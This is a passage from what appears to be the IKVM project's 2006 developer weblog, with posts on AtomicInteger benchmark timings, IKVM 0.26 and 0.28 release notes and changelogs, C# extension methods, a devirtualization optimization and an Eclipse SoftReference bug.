<TD>JDK 1.5 HotSpot Server VM</TD>
<TD>
<P align=right>2282</P></TD></TR>
<TR>
<TD>JDK 1.5 HotSpot Client VM</TD>
<TD>
<P align=right>2922</P></TD></TR>
<TR>
<TD>IKVM</TD>
<TD>
<P align=right>2406</P></TD></TR>
<TR>
<TD>C#</TD>
<TD>
<P align=right>1922</P></TD></TR></TBODY></TABLE>
<P><BR>Note that the test is significantly slower than on the Pentium M. This is most likely because of the bus locking overhead.</P>
<P>It gets even more interesting when we modify the test to have two threads that concurrently increment the same field:</P>
<TABLE id=table2 border=1>
<TBODY>
<TR>
<TD>&nbsp;</TD>
<TD>Time (ms)</TD></TR>
<TR>
<TD>JDK 1.5 HotSpot Server VM</TD>
<TD>
<P align=right>22563</P></TD></TR>
<TR>
<TD>JDK 1.5 HotSpot Client VM</TD>
<TD>
<P align=right>25109</P></TD></TR>
<TR>
<TD>IKVM</TD>
<TD>
<P align=right>15016</P></TD></TR>
<TR>
<TD>C#</TD>
<TD>
<P align=right>12000</P></TD></TR></TBODY></TABLE>
<P>The first thing to note is the fact that the test now takes an order of magnitude more time. Presumably, this is caused by the communication overhead between the two cores.</P>
<P>The second is that here IKVM significantly outperforms HotSpot Server.&nbsp;The reason for this is simple: IKVM uses Interlocked.Increment which ultimately uses the <A href="http://www.arl.wustl.edu/~lockwood/class/cs306/books/artofasm/Chapter_6/CH06-2.html#HEADING2-123">XADD</A> x86 instruction that atomically performs the load/increment/store. By contrast, the AtomicInteger reference implementation uses the following loop to increment the value:</P>
<P><PRE>public final int incrementAndGet() {
    for (;;) {
        int current = get();
        int next = current + 1;
        if (compareAndSet(current, next))
            return next;
    }
}</PRE>
<P>When another thread updates the field between the get and compareAndSet, the compareAndSet&nbsp;will fail and the&nbsp;loop will have to run for another iteration. When&nbsp;multiple CPUs are continuously trying to increment the value this is likely to happen relatively frequently.</P>
<P>Standard disclaimer: As always these microbenchmarks are designed to magnify a particular effect. Be careful about drawing overly large conclusions from them.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/08/2006 21:08:01 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=5d870240-407c-4504-983d-4c65c87aa954"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=5d870240-407c-4504-983d-4c65c87aa954">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 01 June 2006</h2></div>
<div class="newsItems"><a name="a5ae317a7-51ba-47f1-b25d-d773b663522b"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.28 bug fix release</h3>
	<div class="entryBody">
		<P>A new 0.28 release to fix two bugs reported by users. The first bug is a regression that caused native method resolution not to work for statically compiled code and the second bug is that <CODE>instanceof</CODE> didn't work with ghost interface arrays (e.g. <CODE>obj instanceof Serializable[]</CODE> would cause the runtime to abort). No other changes.</P>
<P>Files are available here: <A href="http://www.frijters.net/ikvm-0.28.0.1.zip">ikvm-0.28.0.1.zip</A> (sources + binaries), <A href="http://www.frijters.net/ikvmbin-0.28.0.1.zip">ikvmbin-0.28.0.1.zip</A> (binaries), <A href="http://www.frijters.net/ikvmbin-generics-0.28.0.1.zip">ikvmbin-generics-0.28.0.1.zip</A> (binaries built from generics branch)</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/01/2006 09:48:05 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=5ae317a7-51ba-47f1-b25d-d773b663522b"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=5ae317a7-51ba-47f1-b25d-d773b663522b">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 30 May 2006</h2></div>
<div class="newsItems"><a name="a7882b136-400e-4a01-aa8d-8113031f85f7"></a><div class="entry">
	<h3 class="entryTitle">java.util.concurrent.atomic.AtomicInteger</h3>
	<div class="entryBody">
		<P>Last week Tom Tromey <A href="http://developer.classpath.org/pipermail/classpath-patches/2006-May/002350.html">posted</A> a proposal for a patch to the Classpath patches mailing list for <A href="http://g.oswego.edu/dl/concurrency-interest/">JSR-166</A> support. Triggered by this I did some preliminary investigation to see how much work it will be to support this in IKVM.</P>
<P>The reference implementation uses the sun.misc.Unsafe class to calculate the offset of a field in a class and to directly access this field using the appropriate memory model semantics. HotSpot has intrinsic support for the performance cricitical methods in sun.misc.Unsafe. Unfortunately, this model isn't very suitable for IKVM, because the CLI does not specify a way to portably obtain the offset of a field in a class (and it even allows the offset to change over time). I've implemented all the required methods in sun.misc.Unsafe based on reflection, but obviously this is very slow (preliminary measurements show a 10x to 100x slowdown compared to JDK 1.5).</P>
<P>The good news is that some important classes can easily be ported to a more CLI friendly approach. As an example I've modified the reference implementation of AtomicInteger to use System.Threading.Interlocked.CompareExchange() instead of sun.misc.Unsafe.compareAndSwapInt(). This is a small change and allows for good performance. Here is the benchmark I used:</P><PRE>import java.util.concurrent.atomic.*;
<BR>
public class test {<BR>  static AtomicInteger foo = new AtomicInteger(0);<BR>
  public static void main(String[] args) {<BR>    long start = System.currentTimeMillis();<BR>    for (int i = 0; i &lt; 100000000; i++) {<BR>      foo.incrementAndGet();<BR>    }<BR>    long end = System.currentTimeMillis();<BR>    System.out.println(end - start);<BR>    System.out.println(foo);<BR>  }<BR>}</PRE>
<P>Here are the timings (IKVM and C# timings on Microsoft .NET Framework 1.1):</P>
<TABLE border=1>
<TBODY>
<TR>
<TD>&nbsp;</TD>
<TD>Time (ms)</TD></TR>
<TR>
<TD>JDK 1.5 HotSpot Server VM</TD>
<TD>
<P align=right>861</P></TD></TR>
<TR>
<TD>JDK 1.5 HotSpot Client VM</TD>
<TD>
<P align=right>1312</P></TD></TR>
<TR>
<TD>IKVM</TD>
<TD>
<P align=right>1543</P></TD></TR>
<TR>
<TD>C#</TD>
<TD>
<P align=right>1452</P></TD></TR></TBODY></TABLE>
<P><BR>I included the C# version for comparision. Here is the source for it:<PRE>using System;<BR>using System.Threading;<BR>
<BR>public class test {<BR>  static int foo;<BR>
  static void Main() {<BR>    int start = Environment.TickCount;<BR>    for (int i = 0; i &lt; 100000000; i++) {<BR>      Interlocked.Increment(ref foo);<BR>    }<BR>    int end = Environment.TickCount;<BR>    Console.WriteLine(end - start);<BR>    Console.WriteLine(foo);<BR>  }
}</PRE>
<P>Note how much easier the C# programming model is. Given support for managed by ref arguments, there is no need for an extra indirection or hacks like sun.misc.Unsafe.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/30/2006 12:27:17 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=7882b136-400e-4a01-aa8d-8113031f85f7"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=7882b136-400e-4a01-aa8d-8113031f85f7">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 23 May 2006</h2></div>
<div class="newsItems"><a name="a4705605f-f63f-4168-84cb-dfe20a9b3a3c"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.28 Released</h3>
	<div class="entryBody">
		<P>I released 0.28 (same bits as last week's release candidate) to <A href="http://sourceforge.net/project/showfiles.php?group_id=69637">SourceForge</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/23/2006 13:30:32 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=4705605f-f63f-4168-84cb-dfe20a9b3a3c"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=4705605f-f63f-4168-84cb-dfe20a9b3a3c">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 16 May 2006</h2></div>
<div class="newsItems"><a name="a13374ce5-837d-4a79-98b2-83a101bce748"></a><div class="entry">
	<h3 class="entryTitle">Using foreach to enumerate Java collections in C# 3.0</h3>
	<div class="entryBody">
		A long standing feature request for IKVM has been to make Java collections implement System.IEnumerable and I've always resisted doing that for various reasons.
<P>I while ago -- while discussing this with Stuart Ballard -- I realised that with the proposed C# 3.0 language extensions, in particular "extension methods" it should be possible to make Java collections foreach-able with little effort:</P><PRE>namespace java.util
{<BR>&nbsp; public static class CollectionExtensionMethods<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; public static IEnumerator GetEnumerator(this java.util.Collection col)<BR>&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return new CollectionEnumerator(col);<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp; }<BR>
}</PRE>
<P>For those who don't know how extension methods work, basically the above code (note the <I>this</I> keyword before the argument type) adds a method to java.util.Collection that feels like an instance method.
<P>Given the way foreach works, I had expected that it too would recognize this GetEnumerator method and therefore work on all Java collections, but alas that is not the case.<BR>If you want to see this changed before C# 3.0 is released, please <A href="http://lab.msdn.microsoft.com/ProductFeedback/viewFeedback.aspx?FeedbackId=1c8e8644-4539-418f-869b-8dc44e8a28fa">vote</A>. Alternatively, if you're Miguel and on the ECMA C# committee, it should be obvious what to do ;-)</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/16/2006 15:03:28 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=13374ce5-837d-4a79-98b2-83a101bce748"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=13374ce5-837d-4a79-98b2-83a101bce748">Comments [4]</a>
		
		<br clear="all">
	</div>
</div><a name="af99aa0d3-e484-4619-b28e-51a7aec0ec9e"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.28 rc1</h3>
	<div class="entryBody">
		<P>A new release candidate based on GNU Classpath 0.91. I did some perf work and a fair bit of restructuring in the way class loaders work, to better support ikvmc and ikvmstub on assemblies loaded in the ReflectionOnly context (on .NET 2.0). The perf work resulted in a significantly improved startup time for Eclipse (IKVM 0.26: 1 minute 23 seconds, IKVM 0.28: 55 seconds).</P>
<P>Updated japi results are available <A href="http://www.frijters.net/ikvm-japi-status.html">here</A>. The comparison is against JDK 1.5 now and ignores the generics metadata.</P>
<P>Changes:</P>
<UL>
<LI>Integrated <A href="http://www.gnu.org/software/classpath/announce/20060515.html">GNU Classpath 0.91</A> plus one <A href="http://www.frijters.net/Toolkit.java.patch.txt">patch</A>.</LI>
<LI>Added explicit null check for return value of GetEntryAssembly() in VMSystemProperties.</LI>
<LI>Implemented socket timeout by using Socket.Poll() instead of setting the timeout on the underlying socket (because .NET 2.0 considers the socket broken after a Read timed out).</LI>
<LI>Removed classLoader field from TypeWrapper and made GetClassLoader() abstract (to enable subclasses to use a more efficient way to store the class loader).</LI>
<LI>Moved creation of java.lang.Class object from TypeWrapper constructor (because it would trigger a call to GetClassLoader before that was ready to return meaningful data and also because it wasn't semantically correct to expose the TypeWrapper instance before it was fully constructed).</LI>
<LI>Added ikvm.lang.Internal annotation to mark types and members as internal to the assembly (supported by ikvmc only, not in dynamic mode.) Note that ikvm.lang.Internal should only be applied to public types and members. Note also that to reflection these internal types and members will appears as package private.</LI>
<LI>Removed map.xml hacks to work around cross package accessibility issues (now done by marking the appropriate types/members public and annotating them with @ikvm.lang.Internal).</LI>
<LI>Added map.xml implementation of Class.newInstance (to support @ikvm.lang.Internal).</LI>
<LI>Changed ClassFile to pack major version and flags together to reduce the size of the object.</LI>
<LI>Changed ClassFile.FieldOrMethod to pack flags together.</LI>
<LI>Simplified (and made more consistent) member access checking in reflection.</LI>
<LI>Added -privatepackage option to ikvmc (to mark all classes in a package tree as internal).</LI>
<LI>Fixed object model remapping to add methods inherited from Object to Throwable.</LI>
<LI>Fixed some edge cases in method override resolution.</LI>
<LI>Added optimization to compiler to devirtualize method calls on this reference when it is safe to do so.</LI>
<LI>Added volatile opcode prefix to remapper.</LI>
<LI>Added support for specifying .NET types in catch block to remapper.</LI>
<LI>Made 1.5 support part of the standard build.</LI>
<LI>Restructed ikvmc.exe and IKVM.Runtime.dll.</LI>
<LI>Centralized caching of ByteCodeHelper MethodInfos in ByteCodeHelperMethods.</LI>
<LI>Fixed Thread.join() bug that caused join to spin for large timeouts.</LI>
<LI>Added optimization to not emit linenumbertable for methods that cannot throw exceptions.</LI>
<LI>Much improved annotation support.</LI>
<LI>Fixed ikvmc to only generate corresponding .NET attributes for annotations that have RetentionPolicy.RUNTIME.</LI>
<LI>Fixed ikvmc to add AttributeUsageAttribute to annotation attributes (based on the Target annotation).</LI>
<LI>Optimized verifier a little by making InstructionState use copy-on-write strategy.</LI>
<LI>Changed string comparisons to ReferenceEquals when possible (identifiers are interned, so this is usually possible).</LI>
<LI>Improved VMStackWalker.getCalling[Class|ClassLoader] performance by removing the unnecessary check for HideFromJava/HideFromReflection attributes.</LI>
<LI>Almost completely removed usage of custom attributes for dynamically compiled code (because defining custom attributes is slow).</LI>
<LI>Fixed race condition when two threads define the same class name in two different class loaders at the same time.</LI>
<LI>Fixed possible deadlock while finishing dynamically loaded types.</LI>
<LI>Fixed bug in Class.getModifiers() for statically compiled anonymous inner classes.</LI>
<LI>Moved loading .NET types by their assembly qualified names from the class loader to Class.forName.</LI>
<LI>Fixed class loader not to load Java classes, by their .NET array, pointer or reference name.</LI>
<LI>Moved hack to return system class loader for .NET and statically compiled types from [Compiled|DotNet]TypeWrapper to Class.getClassLoader.</LI></UL>
<P>Files are available here: <A href="http://www.frijters.net/ikvm-0.28.0.0.zip">ikvm-0.28.0.0.zip</A> (sources + binaries), <A href="http://www.frijters.net/ikvmbin-0.28.0.0.zip">ikvmbin-0.28.0.0.zip</A> (binaries), <A href="http://www.frijters.net/ikvmbin-generics-0.28.0.0.zip">ikvmbin-generics-0.28.0.0.zip</A> (binaries built from generics branch)</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/16/2006 11:06:10 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=f99aa0d3-e484-4619-b28e-51a7aec0ec9e"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=f99aa0d3-e484-4619-b28e-51a7aec0ec9e">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 06 April 2006</h2></div>
<div class="newsItems"><a name="ad4cb2ad2-fa1d-4ac1-83ec-1b222ea88e2e"></a><div class="entry">
	<h3 class="entryTitle">@ikvm.lang.Internal</h3>
	<div class="entryBody">
		<P>Hopefully <A href="http://blogs.sun.com/roller/page/gbracha?entry=developing_modules_for_development">someday</A> Java will support more than the current simplistic scheme where classes are either public or non-public. In the meantime, I've added support to ikvmc for marking classes (and members) as internal (i.e. private to the assembly they live in). By marking a public class with the @ikvm.lang.Internal annotation ikvmc (and IKVM.Runtime.dll) will only allow access to the class by other code also living in the same assembly. I've also added a switch to ikvmc for making an entire package tree internal (the switch is named -privatepackage:&lt;prefix&gt;).</P>
<P>In addition, I've now enabled 1.5 support in the mainline version. Many of the 1.5 APIs that previously were only available on the GNU Classpath generics branch have been ported to the trunk, so it is starting to make more sense to enable 1.5 support in the VM by default.</P>
<P>The code is in cvs, although SourceForge has been having some problems, so it might not yet be available thru anoncvs. Development snapshot binaries are available <A href="http://www.frijters.net/ikvmbin.zip">here</A>. </P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		04/06/2006 14:42:05 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=d4cb2ad2-fa1d-4ac1-83ec-1b222ea88e2e"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=d4cb2ad2-fa1d-4ac1-83ec-1b222ea88e2e">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 30 March 2006</h2></div>
<div class="newsItems"><a name="acfdffb1f-252d-4fe7-a0d3-66d0632724b0"></a><div class="entry">
	<h3 class="entryTitle">A Micro Optimization</h3>
	<div class="entryBody">
		<P>Yesterday I thought of a potential micro optimization for the generated CIL code. Since I'm now tracking method invocations on the this reference, it is possible to devirtualize calls to final methods or methods that are provably not overridden. I didn't expect too much from this optimization, because I assumed that the .NET JIT is capable of doing the same optimization and so the only effective difference would be the removal of the explict null check of the this reference.</P>
<P>After implementing the optimization I wrote a micro benchmark:</P><PRE>final class perf {
  public static void main(String[] args) {
    perf p = new perf();
    p.runTest();
  }
  private void runTest() {
    long start = System.currentTimeMillis();
    for (int i = 0; i &lt; 1000000000; i++) {
      equals(null);
    }
    long end = System.currentTimeMillis();
    System.out.println(end - start);
  }
}</PRE>
<P>Here are the results: 
<TABLE id=table1 border=1>
<TBODY>
<TR>
<TD>&nbsp;</TD>
<TD align=right>Time (ms)</TD></TR>
<TR>
<TD>IKVM 0.26</TD>
<TD align=right>10806</TD></TR>
<TR>
<TD>IKVM 0.27</TD>
<TD align=right>1883</TD></TR>
<TR>
<TD>JDK 1.1</TD>
<TD align=right>4597</TD></TR>
<TR>
<TD>JDK 1.5 Client VM</TD>
<TD align=right>12068</TD></TR>
<TR>
<TD>JDK 1.5 Server VM</TD>
<TD align=right>0</TD></TR></TBODY></TABLE></P>
<P><BR>Somewhat to my surprise neither JDK 1.5 Client VM nor the .NET Framework JIT realised that the virtual method invocation could be devirtualized. Unsurprisingly, HotSpot Server VM was able to deduce that the loop didn't actually do anything at all and optimize it away entirely.</P>
<P>I also threw in JDK 1.1, because as usual in microbenchmarks it outperforms HotSpot Client VM.</P>
<P>Note that the use of the equals method in the benchmark is not very significant, it's just a placeholder for a simple method that can easily be inlined. This optimization is most significant for simple property getters that can be inlined.</P>
<P>The code for this optimization is not yet in cvs.</P>
<P><B>Oops</B></P>
<P>On a more embarrassing note, doing this optimization also revealed a hole in the object model remapping. Throwable doesn't properly inherit all the Object methods. The code that gets generated works correctly (in most cases), but it is not verifiable. Here's an example of something that is currently broken:</P><PRE>public class test extends Throwable {
  public static void main(String[] args) throws Exception {
    test c = new test() {
      protected Object clone() {
        return "OK";
      }
    };
    System.out.println(c.clone());
  }
}</PRE>
<P>Running this on IKVM throws a CloneNotSupportedException instead of printing OK.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/30/2006 11:08:03 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=cfdffb1f-252d-4fe7-a0d3-66d0632724b0"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=cfdffb1f-252d-4fe7-a0d3-66d0632724b0">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 24 March 2006</h2></div>
<div class="newsItems"><a name="a13d07e9d-7083-41c1-b23b-78d41a30647e"></a><div class="entry">
	<h3 class="entryTitle">Rotor 2.0 released</h3>
	<div class="entryBody">
		<P><A href="http://discuss.develop.com/archives/wa.exe?A2=ind0603d&amp;L=dotnet-rotor&amp;T=0&amp;F=&amp;S=&amp;P=54">Microsoft released Rotor 2.0</A>. Rotor is the Shared Source implementation of the CLI (and shares a large part of the code with the .NET Framework 2.0).</P>
<P>Congratulations and thanks to the Rotor team!</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/24/2006 16:07:55 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=13d07e9d-7083-41c1-b23b-78d41a30647e"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=13d07e9d-7083-41c1-b23b-78d41a30647e">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 23 March 2006</h2></div>
<div class="newsItems"><a name="abc675718-bf49-4330-95f0-4cfce5e29ad8"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.26 Released</h3>
	<div class="entryBody">
		<P>I finally got around to releasing the 0.26 bits (identical to rc2). Get them <A href="http://sourceforge.net/project/showfiles.php?group_id=69637">here</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/23/2006 13:34:00 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=bc675718-bf49-4330-95f0-4cfce5e29ad8"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=bc675718-bf49-4330-95f0-4cfce5e29ad8">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Saturday, 11 March 2006</h2></div>
<div class="newsItems"><a name="afe39f91e-995c-46fc-9446-6357df2af5ea"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.26 rc2</h3>
	<div class="entryBody">
		<P>A new release candidate. It turns out I was a little over enthusiastic in restructuring the class loading to move dynamic class loading into a subclass (which I did to make it easier to build a version of IKVM.Runtime.dll that doesn't support dynamic class loading, to run on the Compact Framework). java.lang.reflect.Proxy support requires that you can dynamically load classes in the bootstrap class loader, so I added back support for that (in a hacky way by delegating to a bogus instance of DynamicClassLoader). This bug was reported by Chris Keller who was also kind enough to fix two socket bugs.</P>
<P>Changes:</P>
<UL>
<LI>Restored the ability to dynamically load a class in the bootstrap class loader. 
<LI>Changed PlainSocketImpl to throw java.net.SocketTimeoutException instead of java.io.InterruptedIOException when a timeout expires. 
<LI>Changed PlainSocketImpl.read() to return zero instead of throwing an exception when a non-blocking socket read would block.</LI></UL>
<P>Files are available here: <A href="http://www.frijters.net/ikvm-0.26.0.1.zip">ikvm-0.26.0.1.zip</A> (sources + binaries), <A href="http://www.frijters.net/ikvmbin-0.26.0.1.zip">ikvmbin-0.26.0.1.zip</A> (binaries), <A href="http://www.frijters.net/ikvmbin-generics-0.26.0.1.zip">ikvmbin-generics-0.26.0.1.zip</A> (binaries built from generics branch)</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/11/2006 19:48:06 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=fe39f91e-995c-46fc-9446-6357df2af5ea"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=fe39f91e-995c-46fc-9446-6357df2af5ea">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 08 March 2006</h2></div>
<div class="newsItems"><a name="a79f53d4f-53a3-478f-98c0-24949dab03b1"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.26 rc1</h3>
	<div class="entryBody">
		<P>A new release candidate based on GNU Classpath 0.90 (the successor to 0.20). IKVM.GNU.Classpath.dll grew by more than a megabyte. A big part of this is due to the new crypto implementation that was merged into GNU Classpath. This a great improvement!</P>
<P>Updated japi results are available <A href="http://www.frijters.net/ikvm-japi-status.html">here</A>.</P>
<UL>
<LI>Integrated <A href="http://www.gnu.org/software/classpath/announce/20060306.html">GNU Classpath 0.90</A></LI>
<LI>Updated classpath.security with new security providers</LI>
<LI>Added "Windows Vista" as a possible value of os.name system property</LI>
<LI>Included VMObjectInputStream.currentClassLoader() fix from Classpath version</LI>
<LI>Fixed Float.toString() bug (1E8 would be converted to "1E+08.0" instead of "1.0E8")</LI>
<LI>Made some VMThread members package accessible to avoid accessor methods</LI>
<LI>Added copyright banners to executables (when run without command line arguments or with the -version option)</LI>
<LI>Added "-showversion" option to ikvm.exe</LI>
<LI>Fixed ikvmstub to use IKVM.Runtime.Util.GetClassFromTypeHandle() instead of IKVM.Runtime.Util.GetFriendlyClassFromType(), because that would cause problems on remapped types in mscorlib.</LI>
<LI>Fixed support for dynamically instantiating a class that was not loadable at method compilation time.</LI>
<LI>Added support for running interface static initializer when accessing a final field.</LI>
<LI>Moved most .NET resource reading code from IKVM.GNU.Classpath to IKVM.Runtime, to make it easier to use new resource and compression APIs on Whidbey.</LI>
<LI>Introduced ikvm.io.InputStreamWrapper (wraps a java.io.InputStream around a System.IO.Stream).</LI>
<LI>Removed undocumented -manifestResources ikvmc option. When compiled for Whidbey, resources are now always stored as manifest resources.</LI>
<LI>When compiled for Whidbey, resources are now compressed using DeflateStream instead of custom compression.</LI>
<LI>Changed SoftReference never to be cleared, since there is no reliable way to detect low memory and clearing them too eagerly breaks Eclipse.</LI>
<LI>Fixed ikvmstub to also export implemented interfaces that are non-public.</LI>
<LI>Split off dynamic class loading support from ClassLoaderWrapper.cs into new DynamicClassLoader.cs.</LI>
<LI>Moved static compiler support from vm.cs to new file CompilerClassLoader.cs.</LI>
<LI>Fixed CompiledTypeWrapper and DotNetTypeWrapper to finish base class and interfaces in their Finish method.</LI></UL>
<P>Files are available here: <A href="http://www.frijters.net/ikvm-0.26.0.0.zip">ikvm-0.26.0.0.zip</A> (sources + binaries), <A href="http://www.frijters.net/ikvmbin-0.26.0.0.zip">ikvmbin-0.26.0.0.zip</A> (binaries), <A href="http://www.frijters.net/ikvmbin-generics-0.26.0.0.zip">ikvmbin-generics-0.26.0.0.zip</A> (binaries built from generics branch)</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/08/2006 11:14:37 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=79f53d4f-53a3-478f-98c0-24949dab03b1"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=79f53d4f-53a3-478f-98c0-24949dab03b1">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Saturday, 11 February 2006</h2></div>
<div class="newsItems"><a name="aec45dec2-ec22-4079-9b78-d06e15ddabe7"></a><div class="entry">
	<h3 class="entryTitle">Eclipse Again</h3>
	<div class="entryBody">
		<P>Nat <A href="/CommentView.aspx?guid=a875bb80-77a4-450a-95a6-27d2305347f1">commented</A> on the previous entry:</P>
<P><I>I just tried to run ikvm against eclipse 3.1.2. It failed with the following message: <BR><BR>!ENTRY initial@reference:file:plugins/org.eclipse.core.runtime_3.1.2.jar/ 0 0 2006-02-02 11:49:09.218 <BR>!MESSAGE FrameworkEvent.ERROR <BR>!STACK 0 <BR>org.eclipse.core.runtime.InvalidRegistryObjectException: Invalid registry object<BR>...</I></P>
<P>This turns out to be caused by a SoftReference that is being cleared too eagerly. Since .NET has no soft references and there is no way to determine if the managed heap is running low, I used a hack to always promote objects referenced by a soft reference to generation 2 and from there on treat them as weak references, which effectively means they will be collected the next time a full GC is run and there are no more strong references to the object. Strictly speaking clearing them before running out of memory is not incorrect, because the Java doc for SoftReference says:</P>
